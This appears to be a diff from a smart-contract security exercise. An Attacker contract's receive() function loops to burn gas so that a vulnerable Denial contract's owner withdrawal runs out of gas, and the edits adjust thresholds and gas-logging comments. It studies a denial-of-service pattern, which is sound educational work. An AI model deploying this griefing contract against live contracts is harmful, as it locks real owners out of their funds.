@@ -21,7 +21,7 @@ contract Denial {
         // The recipient can revert, the owner will still get their share
         partner.call{value: amountToSend}("");
 
-        console.log("***1_WITHDRAW_GAS_LEFT:", gasleft()); // 17022
+        console.log("***1_WITHDRAW_GAS_LEFT:", gasleft()); // 15977 Gas left
         payable(owner).transfer(amountToSend);
         console.log("***2_WITHDRAW_GAS_LEFT:", gasleft()); // Not called!!!
 
@@ -60,7 +60,7 @@ contract Attacker {
     }
 
     receive() external payable {
-        while (gasleft() > 20_000) {
+        while (gasleft() > 30_000) {
             uint256 _gasLeft = gasleft();
             iterations++;
             uint256 _blockLimit = block.gaslimit;
@@ -79,16 +79,14 @@ contract Attacker {
             GasLeft memory item1 = gasLefts[1];
             GasLeft memory item2 = gasLefts[2];
             GasLeft memory item3 = gasLefts[3];
-            GasLeft memory item4 = gasLefts[4];
-            GasLeft memory item5 = gasLefts[5];
         }
 
         {
-            GasLeft memory item6 = gasLefts[6];
             GasLeft memory item7 = gasLefts[7];
             GasLeft memory item8 = gasLefts[8];
+            GasLeft memory item9 = gasLefts[9];
         }
 
-        console.log("***RECEIVE_GAS_LEFT:", gasleft()); // 2343
+        console.log("***RECEIVE_GAS_LEFT:", gasleft()); // 1298 Gas left
     }
 }
